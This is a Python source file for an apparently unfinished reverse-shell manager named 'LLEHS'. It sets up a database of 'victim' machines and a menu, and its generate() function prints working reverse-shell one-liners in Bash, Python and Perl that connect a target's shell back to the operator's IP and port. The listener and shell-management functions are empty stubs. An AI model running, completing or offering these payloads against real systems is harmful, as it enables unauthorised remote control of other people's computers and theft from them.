import os
import time
import socket
import subprocess
from flask import Flask
from flask_sqlalchemy import SQLAlchemy

# Initialize Flask app (not necessary for database operations)
app = Flask(__name__)

# Configure database URI
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///llehs.db'

# Suppress deprecation warnings
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize SQLAlchemy object
db = SQLAlchemy(app)

# Define the Victim model
class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    nickname = db.Column(db.String(50))
    port = db.Column(db.Integer)
    ip = db.Column(db.String(15)) # The IP address of the victim machine-Get this when the reverse shell is generated
    startUpIp = db.Column(db.String(15)) # The IP address of the machine when the reverse shell was generated
    systemInfo = db.Column(db.String(100)) # The system information of the victim machine when the reverse shell was generated
    timeOfConnection = db.Column(db.DateTime)

# Create the application context
with app.app_context():
    # Create the database tables
    db.create_all()


# Listener and handler for one, multiple, or all shells
def listener():
    pass

# Generate reverse shell
def generate():
    port = input("Enter the port number: ")
    ip = socket.gethostbyname(socket.gethostname())
    
    print("Choose a shell script:")
    print("[1] - Bash")
    print("[2] - Python")
    print("[3] - Perl")
    print("[4] - Ruby")
    print("[5] - Netcat")
    print("[6] - Java")
    print("[7] - PHP")
    print("[8] - Powershell")
    print("[9] - Node.js")
    print("[10] - xterm")
    print("[12] - telnet")
    
    shell_choice = input(": ")
    
    if shell_choice == "1":
        print(f"Bash shell script with IP {ip} and port {port}:")
        print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
    elif shell_choice == "2":
        print(f"Python shell script with IP {ip} and port {port}:")
        print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'")
    elif shell_choice == "3":
        print(f"Perl shell script with IP {ip} and port {port}:")
        print(f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'")
    
    
    else:
        print("Invalid choice")

# List all shells
def listShells():
    pass

# Manage shells
def manageShells():
    pass

# Help
def help():
    print("Help Menu")
    print("1. Connect - Connect to a reverse shell")
    print("2. Generate - Generate a reverse shell")
    print("3. List - List all reverse shells")
    print("4. Manage - Manage reverse shells")
    print("9. Help - Display this help menu")
    print("0. Exit - Exit the program")


if __name__ == "__main__":
    os.system("clear")
    print("Welcome to...\n")
    print(" $$\       $$\       $$$$$$$$\ $$\   $$\  $$$$$$\  \n",
          "$$ |      $$ |      $$  _____|$$ |  $$ |$$  __$$\ \n",
          "$$ |      $$ |      $$ |      $$ |  $$ |$$ /  \__|\n",
          "$$ |      $$ |      $$$$$\    $$$$$$$$ |\$$$$$$\  \n",
          "$$ |      $$ |      $$  __|   $$  __$$ | \____$$\ \n",
          "$$ |      $$ |      $$ |      $$ |  $$ |$$\   $$ |\n",
          "$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$ |  $$ |\$$$$$$  |\n",
          "\________|\________|\________|\__|  \__| \______/ \n\n",
          "                            ","*pssst its shell in reverse x x\n",
          "                                                        "," U \n")
    print("Please select one:\n")
    print("[1] - [C]onnect")
    print("[2] - [G]enerate RS")
    print("[3] - [L]ist shells")
    print("[4] - [M]anage shells")
    print("[9] - [H]elp")
    print("[0] - [E]xit\n")
    while(True):
        try:
            userInput = input(": ")
            if userInput == "0" or userInput.lower() == "e" or userInput.lower() == "exit":
                print("GoodBye")
                break
            elif userInput == "1" or userInput.lower() == "c" or userInput.lower() == "connect":
                print("work in progress/1")
            elif userInput == "2" or userInput.lower() == "g" or userInput.lower() == "generate":
                generate()
            elif userInput == "3" or userInput.lower() == "l" or userInput.lower() == "list":
                print("work in progress/3")
            elif userInput == "4" or userInput.lower() == "m" or userInput.lower() == "manage":
                print("work in progress/4")
            elif userInput == "9" or userInput.lower() == "h" or userInput.lower() == "help":
                print("Help")
            else:
                print("WRONG")
                continue
        except KeyboardInterrupt:
            os.system("clear")
            time.sleep(2)
            print("Why you trying to leave...")
            time.sleep(2)
            print("YOUR STUCK HERE...")
            time.sleep(5)
            print("JK")
            break